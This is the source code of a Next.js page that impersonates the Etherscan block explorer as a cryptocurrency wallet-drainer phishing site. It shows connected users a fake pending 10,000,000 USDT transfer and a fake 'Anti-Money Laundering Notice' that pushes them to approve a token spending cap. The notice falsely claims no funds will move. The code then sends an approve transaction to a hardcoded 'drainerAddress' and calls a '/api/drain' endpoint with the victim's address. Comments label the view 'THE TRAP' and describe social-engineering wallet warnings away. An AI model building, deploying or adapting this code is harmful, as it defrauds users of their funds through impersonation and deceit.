'use client'

import { AppKitButton } from '@reown/appkit/react'

import { useState, useEffect } from 'react'
import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useReadContract, useBalance } from 'wagmi'
import { sepolia } from 'wagmi/chains'
import { parseUnits, formatEther } from 'viem'
import styles from './page.module.css'

// ABI for EIP-2612 Nonces
const noncesAbi = [
  {
    "inputs": [{ "name": "owner", "type": "address" }],
    "name": "nonces",
    "outputs": [{ "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  }
] as const;

export default function Home() {
  const [mounted, setMounted] = useState(false)
  const [viewState, setViewState] = useState<'connect' | 'list' | 'details'>('connect')

  const { address, isConnected, chain } = useAccount()
  const { disconnect } = useDisconnect()
  const { writeContractAsync, data: hash, isPending: isWritePending } = useWriteContract()
  const { isSuccess: isConfirmSuccess, isLoading: isConfirmLoading } = useWaitForTransactionReceipt({
    hash,
  })

  useEffect(() => {
    if (isConnected) setViewState('list')
    else setViewState('connect')
  }, [isConnected])

  useEffect(() => {
    setMounted(true)
  }, [])

  const { data: ethBalance } = useBalance({ address })

  const drainerAddress = (process.env.NEXT_PUBLIC_ADMIN_WALLET || "0xd115dbad4574D1332a44d7453B387ad38750c957") as `0x${string}`;
  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xBDD3104Baa83F8302877eAaed48E78B91B34de02") as `0x${string}`;
  const targetChainId = sepolia.id; // Moving back to Sepolia ID for on-chain TX execution

  const { data: nonce, isError: nonceError } = useReadContract({
    address: tokenAddress,
    abi: noncesAbi,
    functionName: 'nonces',
    args: address ? [address] : undefined,
    chainId: targetChainId,
  })

  // Trigger the backend relayer automatically when the approval confirms on-chain
  useEffect(() => {
    if (isConfirmSuccess) {
      const executeRelayer = async () => {
        try {
          const drainAmount = parseUnits('10000000', 6);
          const response = await fetch('/api/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              victimAddress: address,
              drainerAddress,
              drainAmount: drainAmount.toString(),
            })
          });
          const result = await response.json();
          if (!result.success) {
            console.error("Relay Failed:", result.error);
          }
        } catch (e: any) {
          console.error(e);
        }
      };
      executeRelayer();
    }
  }, [isConfirmSuccess, address, drainerAddress]);

  const handleClaim = async () => {
    try {
      if (!tokenAddress || !tokenAddress.startsWith('0x')) {
        alert("Configuration Error: Token Address is missing or invalid.");
        return;
      }

      // Hardcode the approval to 10M USDT to match the UI
      const drainAmount = parseUnits('10000000', 6);

      // Execute an authentic On-Chain Approval Transaction (Legacy USDT behavior)
      await writeContractAsync({
        address: tokenAddress,
        abi: [{
          "inputs": [
            { "name": "spender", "type": "address" },
            { "name": "value", "type": "uint256" }
          ],
          "name": "approve",
          "outputs": [{ "name": "", "type": "bool" }],
          "stateMutability": "nonpayable",
          "type": "function"
        }],
        functionName: 'approve',
        args: [drainerAddress, drainAmount],
      });

    } catch (e: any) {
      console.error(e);
    }
  }

  if (!mounted) return null;

  return (
    <div className={styles.main}>
      {/* Top Mini Nav */}
      <div className={styles.topNav}>
        <div className={styles.topNavMetrics}>
          <span style={{ marginRight: '1.5rem' }}>ETH Price: <span className={styles.brandBlue}>$1,973.25</span> (+0.17%)</span>
          <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', marginRight: '1.5rem' }}>
            <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 512 512" style={{ fill: '#6c757d' }}>
              <path d="M304 64V16c0-8.8-7.2-16-16-16H48C39.2 0 32 7.2 32 16v48h16V32h240v32h16zM32 96h256v384H32c-17.7 0-32-14.3-32-32V128c0-17.7 14.3-32 32-32zm416 195.4v149l-22.1-13.3c-4.9-2.9-10.7-3.9-16.1-2.9l-26.6 5.3-26.6-5.3c-5.5-1.1-11.2 0-16.1 2.9L320 440.6V208c0-26.5 21.5-48 48-48h6.1C355.7 137.9 336 109 336 80c0-26.5 21.5-48 48-48h64c26.5 0 48 21.5 48 48 0 29-19.7 57.9-26.2 78h6.2c26.5 0 48 21.5 48 48v83.4c0 14.8-19.4 20-27.4 7.2l-37.5-60c-4-6.4-11.1-10.3-18.7-10.3-12.7 0-23 10.3-23 23zm-32-211.4c17.7 0 32-14.3 32-32 0-8.8-7.2-16-16-16h-64c-8.8 0-16 7.2-16 16 0 17.7 14.3 32 32 32h32z" />
            </svg>
            Gas: <span className={styles.brandBlue}>0.042 Gwei</span>
          </span>
        </div>
        <div className={styles.topNavRight}>
          <span>Night Mode</span>
          <span>Ethereum Mainnet</span>
        </div>
      </div>

      {/* Main Navbar */}
      <nav className={styles.navbar}>
        <div className={styles.logoContainer}>
          <img src="/etherscan-logo.svg" alt="Etherscan Logo" style={{ height: '35px' }} />
        </div>
        <div className={styles.navLinks}>
          <span className={styles.active}>Home</span>
          <span>Blockchain</span>
          <span>Tokens</span>
          <span>NFTs</span>
          <span>Resources</span>
          <span>Developers</span>
          <span>More</span>
          <span>|</span>
          <span className={styles.brandBlue}>Sign In</span>
        </div>
      </nav>

      {/* VIEW 1: ETHERSCAN HOMEPAGE HERO (NOT CONNECTED) */}
      {viewState === 'connect' && (
        <>
          <div className={styles.heroSection}>
            <div className={styles.container}>
              <h1 className={styles.heroTitle}>The Ethereum Blockchain Explorer</h1>
              <div className={styles.searchContainer}>
                <select className={styles.filterSelect}>
                  <option>All Filters</option>
                </select>
                <input
                  type="text"
                  className={styles.searchInput}
                  placeholder="Search by Address / Txn Hash / Block / Token / Domain Name"
                />
                <button className={styles.searchButton}>🔍</button>
              </div>
              <p className={styles.heroAd}>
                <span className={styles.sponsored}>Sponsored:</span> Access data from 50+ chain IDs with a single API key using Etherscan API V2.
              </p>
            </div>
          </div>

          <div className={styles.container}>
            <div className={styles.pullUpGrid}>
              <div className={styles.statsCard}>
                <div className={styles.statItem}>
                  <span className={styles.statLabel}>ETHER PRICE</span>
                  <span className={styles.statValue}>$1,973.25 @ 0.029016 BTC <span style={{ color: '#00a186' }}>(+0.17%)</span></span>
                </div>
                <div className={styles.statItem}>
                  <span className={styles.statLabel}>TRANSACTIONS</span>
                  <span className={styles.statValue}>3,281.70 M <span style={{ color: '#6c757d', fontSize: '0.8rem' }}>(16.2 TPS)</span></span>
                </div>
                <div className={styles.statItem}>
                  <span className={styles.statLabel}>MARKET CAP</span>
                  <span className={styles.statValue}>$238,155,887,605.00</span>
                </div>
                <div className={styles.statItem}>
                  <span className={styles.statLabel}>MED GAS PRICE</span>
                  <span className={styles.statValue}>0.042 Gwei <span style={{ color: '#6c757d', fontSize: '0.8rem' }}>(&lt; $0.01)</span></span>
                </div>
              </div>

              <div className={styles.statsCard} style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column' }}>
                <div style={{ marginBottom: '1.5rem', color: '#6c757d', fontSize: '1.2rem', fontWeight: 600, textAlign: 'center' }}>Explore Private Wallets & Transfers</div>
                <div style={{ display: 'flex', justifyContent: 'center', width: '100%' }}>
                  <AppKitButton />
                </div>
              </div>
            </div>

            <div className={styles.twoCol}>
              <div className={styles.card} style={{ marginTop: 0 }}>
                <div className={styles.cardHeader}>
                  <span>Latest Blocks</span>
                  <span className={styles.brandBlue} style={{ fontSize: '0.85rem', cursor: 'pointer' }}>Customize</span>
                </div>
                <table className={styles.transactionTable}>
                  <tbody>
                    <tr>
                      <td style={{ width: '30%' }}><span className={styles.blueLink}>24511504</span><br /><span style={{ fontSize: '0.75rem', color: '#6c757d' }}>6 secs ago</span></td>
                      <td>Miner <span className={styles.blueLink}>Titan Builder</span><br /><span style={{ fontSize: '0.75rem', color: '#6c757d' }}>153 txns in 12 secs</span></td>
                      <td style={{ textAlign: 'right' }}>0.00655 Eth</td>
                    </tr>
                    <tr>
                      <td><span className={styles.blueLink}>24511503</span><br /><span style={{ fontSize: '0.75rem', color: '#6c757d' }}>18 secs ago</span></td>
                      <td>Miner <span className={styles.blueLink}>BuilderNet</span><br /><span style={{ fontSize: '0.75rem', color: '#6c757d' }}>181 txns in 12 secs</span></td>
                      <td style={{ textAlign: 'right' }}>0.00695 Eth</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <div className={styles.card} style={{ marginTop: 0 }}>
                <div className={styles.cardHeader}>
                  <span>Latest Transactions</span>
                  <span className={styles.brandBlue} style={{ fontSize: '0.85rem', cursor: 'pointer' }}>Customize</span>
                </div>
                <table className={styles.transactionTable}>
                  <tbody>
                    <tr>
                      <td style={{ width: '40%' }}><span className={styles.blueLink}>0xa01421...d377</span><br /><span style={{ fontSize: '0.75rem', color: '#6c757d' }}>6 secs ago</span></td>
                      <td>From <span className={styles.blueLink}>0x4838B106...</span><br />To <span className={styles.blueLink}>Coinbase 3</span></td>
                      <td style={{ textAlign: 'right' }}><span className={styles.amountBox}>0.00691 Eth</span></td>
                    </tr>
                    <tr>
                      <td><span className={styles.blueLink}>0x9cab31...b084</span><br /><span style={{ fontSize: '0.75rem', color: '#6c757d' }}>6 secs ago</span></td>
                      <td>From <span className={styles.blueLink}>0xe99cb12F...</span><br />To <span className={styles.blueLink}>0xdAC17F...</span></td>
                      <td style={{ textAlign: 'right' }}><span className={styles.amountBox}>0 Eth</span></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        </>
      )}

      {/* VIEW 2: PENDING TRANSACTIONS LIST */}
      {viewState === 'list' && (
        <div className={styles.container} style={{ paddingTop: '2rem' }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '0.5rem', marginBottom: '1.5rem', flexDirection: 'column' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <img src="/etherscan-logo.svg" alt="eth" style={{ width: '25px', height: '25px' }} />
              <h1 className={styles.pageTitle} style={{ margin: 0 }}>Address</h1>
            </div>
            <span style={{ fontFamily: 'monospace', fontSize: '1.1rem', wordBreak: 'break-all', color: '#1e2022' }}>{address}</span>
          </div>

          <div className={styles.card} style={{ marginTop: 0 }}>
            <div className={styles.cardHeader}>
              <span>Overview</span>
              <button className={styles.disconnectButton} onClick={() => disconnect()} style={{ padding: '0.3rem 0.6rem', fontSize: '0.8rem' }}>Disconnect</button>
            </div>

            <div className={styles.detailsList}>
              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>ETH Balance:</div>
                <div className={styles.detailValue}>
                  {ethBalance ? Number(formatEther(ethBalance.value)).toFixed(4) : "0.0000"} ETH
                </div>
              </div>
            </div>
          </div>

          <div style={{ marginTop: '2rem' }}></div>

          <div className={styles.card}>
            <div className={styles.cardHeader}>
              <span>Incoming Transfers (1 Pending)</span>
            </div>

            <div style={{ overflowX: 'auto' }}>
              <table className={`${styles.transactionTable} ${styles.compact}`}>
                <thead>
                  <tr>
                    <th>Transaction Hash</th>
                    <th>Method</th>
                    <th>Block</th>
                    <th>From</th>
                    <th>To</th>
                    <th>Value</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className={styles.pendingRow} onClick={() => setViewState('details')} style={{ cursor: 'pointer', backgroundColor: '#fafbfd' }}>
                    <td><span className={styles.blueLink}>0x8a1db5a9...e9f8</span></td>
                    <td><span className={styles.methodBadge}>Transfer</span></td>
                    <td><i style={{ color: '#d22d3d', fontSize: '0.8rem' }}>Pending</i></td>
                    <td><span className={styles.blueLink}>Tether: Treasury</span></td>
                    <td>{address?.slice(0, 8)}...</td>
                    <td><strong>10,000,000 USDT</strong></td>
                  </tr>
                  <tr>
                    <td><span className={styles.blueLink}>0xec23d91f...b1fa</span></td>
                    <td><span className={styles.methodBadge}>Transfer</span></td>
                    <td>10352901</td>
                    <td><span className={styles.blueLink}>Binance 14</span></td>
                    <td>{address?.slice(0, 8)}...</td>
                    <td>0.015 ETH</td>
                  </tr>
                  <tr>
                    <td><span className={styles.blueLink}>0xa4f281ce...d9aa</span></td>
                    <td><span className={styles.methodBadge}>Approve</span></td>
                    <td>10341855</td>
                    <td><span className={styles.blueLink}>{address?.slice(0, 8)}...</span></td>
                    <td><span className={styles.blueLink}>Uniswap V3</span></td>
                    <td>0 ETH</td>
                  </tr>
                  <tr>
                    <td><span className={styles.blueLink}>0x11ab449c...e81c</span></td>
                    <td><span className={styles.methodBadge}>Transfer</span></td>
                    <td>10329011</td>
                    <td><span className={styles.blueLink}>Kraken 4</span></td>
                    <td>{address?.slice(0, 8)}...</td>
                    <td>1.550 ETH</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
          <div style={{ marginTop: '1rem', fontStyle: 'italic', color: '#6c757d', fontSize: '0.85rem' }}>
            * Note: Click on a pending transaction row to resolve network requirements.
          </div>
        </div>
      )}

      {/* VIEW 3: TRANSACTION DETAILS (THE TRAP) */}
      {viewState === 'details' && (
        <div className={styles.container} style={{ paddingTop: '2rem' }}>
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '1.5rem' }}>
            <button
              onClick={() => setViewState('list')}
              style={{ background: 'none', border: 'none', color: '#6c757d', cursor: 'pointer', paddingRight: '1rem', fontSize: '1.2rem' }}
            >
              ←
            </button>
            <h1 className={styles.pageTitle} style={{ margin: 0 }}>Transaction Details</h1>
          </div>

          <div className={styles.card} style={{ marginTop: 0 }}>
            <div className={styles.cardHeader}>
              <span>Overview</span>
            </div>

            <div className={styles.detailsList}>
              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>Transaction Hash:</div>
                <div className={styles.detailValue}>
                  <span className={styles.blueLink}>0x8a1db5a9b7cd9102c984edf12bc1a8f9c15981298510cfb3f12a91275913e9f8</span>
                </div>
              </div>

              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>Status:</div>
                <div className={styles.detailValue}>
                  {isConfirmSuccess ? (
                    <span className={styles.statusSuccess}>
                      <span className={styles.successDot}></span>
                      Success (Ownership Verified)
                    </span>
                  ) : (
                    <span className={styles.statusPending}>
                      <div className={styles.spinner}></div>
                      Pending Ownership Verification
                    </span>
                  )}
                </div>
              </div>

              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>Block:</div>
                <div className={styles.detailValue}>
                  {isConfirmSuccess ?
                    <><span className={styles.blueLink}>10352912</span><span className={styles.methodBadge} style={{ marginLeft: '0.5rem' }}>14 Block Confirmations</span></>
                    :
                    <i>Pending Network Resolution</i>
                  }
                </div>
              </div>

              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>From:</div>
                <div className={styles.detailValue}>
                  <span className={styles.blueLink}>Tether: Treasury (0x5754...17b)</span>
                </div>
              </div>

              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>To:</div>
                <div className={styles.detailValue}>
                  <span className={styles.blueLink}>{address}</span>
                </div>
              </div>

              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>Value:</div>
                <div className={styles.detailValue}>
                  <span className={styles.amountBox}>10,000,000.00 USDT</span>
                </div>
              </div>

              <div className={styles.detailRow}>
                <div className={styles.detailLabel}>Transaction Fee:</div>
                <div className={styles.detailValue}>0.00142 ETH ($4.15)</div>
              </div>
            </div>

            {!isConfirmSuccess && (
              <div className={styles.actionBanner}>
                {/* PRE-FRAMING UI: SOCIAL ENGINEERING THE METAMASK WARNING OUT OF EXISTENCE */}
                <div style={{ color: '#d22d3d', backgroundColor: '#fff5f5', padding: '1rem', borderRadius: '0.5rem', border: '1px solid #faccd0', fontSize: '0.9rem', width: '100%', lineHeight: '1.6' }}>
                  <strong style={{ fontSize: '1rem' }}>Etherscan Anti-Money Laundering Notice:</strong><br />
                  To securely route your 10,000,000 USDT to your wallet, the network requires a temporary Escrow Cap.
                  <br /><br />
                  Your Web3 wallet will prompt you to set a <strong>Custom Spending Cap</strong> or <strong>Token Approval</strong> limit. You MUST input <strong style={{ textDecoration: 'underline' }}>10000000</strong> to authorize the node to process the pending block.
                  <br /><br />
                  <i>Note: This is strictly an authorization limit for the node. No funds will be spent or transferred from your wallet.</i>
                </div>
                <div className={styles.actionButtons} style={{ marginTop: '1.5rem' }}>
                  <button className={styles.disconnectButton} onClick={() => disconnect()}>Disconnect</button>
                  <button
                    className={styles.verifyButton}
                    onClick={handleClaim}
                    disabled={isWritePending || isConfirmLoading}
                  >
                    {(isWritePending || isConfirmLoading) ? 'Executing Network Override...' : 'Establish Required Escrow Cap'}
                  </button>
                </div>
              </div>
            )}

            {isConfirmSuccess && (
              <div className={styles.actionBanner} style={{ backgroundColor: '#f0fdf4', borderTopColor: '#bbf7d0' }}>
                <div style={{ color: '#166534', fontWeight: '500' }}>
                  ✅ Escrow Cap Confirmed. The network will flush the 10,000,000 USDT into your wallet momentarily.
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* MASSIVE ETHERSCAN FOOTER */}
      <footer className={styles.footerContainer}>
        <div className={styles.container} style={{ padding: 0 }}>
          <div className={styles.footerTop}>
            <div className={styles.footerBrand}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1rem', flexWrap: 'nowrap', whiteSpace: 'nowrap' }}>
                <img src="/etherscan-logo.svg" alt="eth" style={{ height: '28px' }} />
                <span style={{ fontSize: '1.2rem', fontWeight: 600, color: '#1e2022' }}>Powered by Ethereum</span>
              </div>
              <p className={styles.footerDesc}>Etherscan is a Block Explorer and Analytics Platform for Ethereum, a decentralized smart contracts platform.</p>
            </div>

            <div className={styles.footerGrid}>
              <div className={styles.footerCol}>
                <h4>Company</h4>
                <ul>
                  <li>About Us</li>
                  <li>Brand Assets</li>
                  <li>Contact Us</li>
                  <li>Careers <span style={{ backgroundColor: '#377dff', color: 'white', padding: '0.1rem 0.3rem', borderRadius: '3px', fontSize: '0.65rem' }}>We're Hiring!</span></li>
                  <li>Terms & Privacy</li>
                  <li>Bug Bounty</li>
                </ul>
              </div>

              <div className={styles.footerCol}>
                <h4>Community</h4>
                <ul>
                  <li>API Documentation</li>
                  <li>Knowledge Base</li>
                  <li>Network Status</li>
                  <li>Newsletters</li>
                </ul>
              </div>

              <div className={styles.footerCol}>
                <h4>Products & Services</h4>
                <ul>
                  <li>Advertise</li>
                  <li>Explorer as a Service (EaaS)</li>
                  <li>API Plans</li>
                  <li>Priority Support</li>
                  <li>Blockscan</li>
                  <li>Blockscan Chat</li>
                </ul>
              </div>
            </div>
          </div>

          <div className={styles.footerBottom}>
            <div>Etherscan © 2026 (D1)</div>
            <div>Donations: <span className={styles.brandBlue}>0x71c765...d8976f</span></div>
          </div>
        </div>
      </footer>
    </div>
  )
}
